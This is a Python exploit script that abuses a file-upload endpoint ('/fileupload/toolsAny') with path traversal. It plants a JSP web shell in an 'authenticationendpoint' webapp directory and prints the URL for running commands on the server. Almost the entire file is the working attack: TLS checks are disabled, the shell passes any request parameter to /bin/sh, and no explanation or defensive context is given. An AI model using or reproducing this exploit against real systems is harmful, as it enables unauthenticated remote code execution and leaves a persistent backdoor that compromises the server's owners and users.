import requests, urllib3, sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} https://host")
    exit()

host = sys.argv[1]

shell = """<%@ page import="java.io.*,java.util.*"%>
<%
    String a = request.getParameter("x");
    if (a != null) {
        ProcessBuilder b = new ProcessBuilder("/bin/sh", "-c", a);
        Process c = b.start();
        Scanner d = new Scanner(c.getInputStream()).useDelimiter("\\A");
        String e = d.hasNext() ? d.next() : "";
        out.println(e);
        d.close();
    }
%>"""

files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/ilto0x0shell.jsp": shell}
response = requests.post(f'{host}/fileupload/toolsAny', data=files, verify=False)

print(f"\nRESPONSE\nStatus Code: {response.status_code}\n{'*'*10}\n{response.text}\n{'*'*10}")
print(f"\nshell @ {host}/authenticationendpoint/ilto0x0shell.jsp?x=id")
